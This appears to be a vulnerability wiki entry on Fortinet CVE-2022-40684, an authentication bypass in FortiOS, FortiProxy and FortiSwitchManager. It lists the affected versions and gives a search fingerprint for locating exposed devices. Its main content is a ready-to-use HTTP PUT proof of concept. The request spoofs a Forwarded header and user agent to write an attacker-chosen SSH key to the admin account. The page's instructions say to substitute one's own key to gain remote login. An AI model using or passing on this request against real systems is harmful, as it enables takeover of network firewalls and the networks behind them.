# Fortinet FortiOS admin remote command execution vulnerability CVE-2022-40684

## Vulnerability Description

Fortinet pointed out on Monday that the CVE-2022-40684 authentication patched last week bypasses security vulnerabilities and is being widely exploited in the wild. 

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">FortiOS <= 7.2.1、7.2.0、7.0.6、7.0.5、7.0.4、7.0.3、7.0.2、7.0.1、7.0.0</span>

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">FortiProxy <= 7.2.0、7.0.6、7.0.5、7.0.4、7.0.3、7.0.2、7.0.1、7.0.0</span>

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">FortiSwitchManager <= 7.2.0、7.0.0</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">title="FortiProxy"</span>

## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1666071814971-81c710e9-88e2-4d38-9a74-9562d4ab7f51-20221018134817098.png)

Verify the POC, replace the admin username and ssh key in ssh-public-key1 when using it, and add remote SSH login credentials

```java
PUT /api/v2/cmdb/system/admin/admin HTTP/1.1
Host: 
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 597
Content-Type: application/json
Forwarded: for="[127.0.0.1]:8888";by="[127.0.0.1]:8888"
User-Agent: Report Runner

{"ssh-public-key1": "123"}
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1666071940784-a4fb7239-bc4e-4a56-9bd2-1a3447dc40cf-20221018134812305.png)